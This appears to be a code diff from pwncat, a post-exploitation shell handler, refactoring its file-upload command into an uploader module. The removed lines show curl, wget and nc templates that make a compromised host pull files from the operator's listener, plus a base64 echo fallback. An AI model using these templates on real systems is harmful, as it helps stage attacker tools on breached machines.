@@ -13,7 +13,7 @@ import sys
 import os
 
 from pwncat import util
-from pwncat import downloader
+from pwncat import downloader, uploader
 
 
 class State(enum.Enum):
@@ -317,18 +317,10 @@ class PtyHandler:
     def do_upload(self, argv):
         """ Upload a file to the remote host """
 
-        downloaders = {
-            "curl": ("http", "curl --output {outfile} http://{lhost}:{lport}/{lfile}"),
-            "wget": ("http", "wget -O {outfile} http://{lhost}:{lport}/{lfile}"),
-            "nc": ("raw", "nc {lhost} {lport} > {outfile}"),
-        }
-        servers = {"http": util.serve_http_file, "raw": util.serve_raw_file}
-
         parser = argparse.ArgumentParser(prog="upload")
         parser.add_argument(
             "--method",
             "-m",
-            choices=downloaders.keys(),
             default=None,
             help="set the download method (default: auto)",
         )
@@ -346,36 +338,25 @@ class PtyHandler:
             # The arguments were parsed incorrectly, return.
             return
 
-        if self.vars.get("lhost", None) is None:
-            util.error("[!] you must provide an lhost address for reverse connections!")
-            return
-
         if not os.path.isfile(args.path):
-            util.error(f"[!] {args.path}: no such file or directory")
+            util.error(f"{args.path}: no such file or directory")
             return
 
-        if args.method is not None and args.method not in self.known_binaries:
-            util.error(f"{args.method}: method unavailable")
-        elif args.method is not None:
-            method = downloaders[args.method]
-        else:
-            method = None
-            for m, info in downloaders.items():
-                if m in self.known_binaries:
-                    util.info("uploading via {m}")
-                    method = info
-                    break
-            else:
-                util.warn(
-                    "no available upload methods. falling back to echo/base64 method"
-                )
+        try:
+            # Locate an appropriate downloader class
+            UploaderClass = uploader.find(self, args.method)
+        except uploader.UploadError as exc:
+            util.error(f"{exc}")
+            return
 
         path = args.path
         basename = os.path.basename(args.path)
         name = basename
         outfile = args.output.format(basename=basename)
 
-        with ProgressBar("uploading") as pb:
+        upload = UploaderClass(self, remote_path=outfile, local_path=path)
+
+        with ProgressBar(f"uploading via {upload.NAME}") as pb:
 
             counter = pb(range(os.path.getsize(path)))
             last_update = time.time()
@@ -389,27 +370,8 @@ class PtyHandler:
                 if (time.time() - last_update) > 0.1:
                     pb.invalidate()
 
-            if method is not None:
-                server = servers[method[0]](path, name, progress=on_progress)
-
-                command = method[1].format(
-                    outfile=shlex.quote(outfile),
-                    lhost=self.vars["lhost"],
-                    lfile=name,
-                    lport=server.server_address[1],
-                )
-
-                result = self.run(command, wait=False)
-            else:
-                server = None
-                with open(path, "rb") as fp:
-                    self.run(f"echo -n > {outfile}")
-                    copied = 0
-                    for chunk in iter(lambda: fp.read(8192), b""):
-                        encoded = base64.b64encode(chunk).decode("utf-8")
-                        self.run(f"echo -n {encoded} | base64 -d >> {outfile}")
-                        copied += len(chunk)
-                        on_progress(copied, len(chunk))
+            upload.serve(on_progress)
+            upload.command()
 
             try:
                 while not counter.done:
@@ -417,8 +379,7 @@ class PtyHandler:
             except KeyboardInterrupt:
                 pass
             finally:
-                if server is not None:
-                    server.shutdown()
+                upload.shutdown()
 
             # https://github.com/prompt-toolkit/python-prompt-toolkit/issues/964
             time.sleep(0.1)
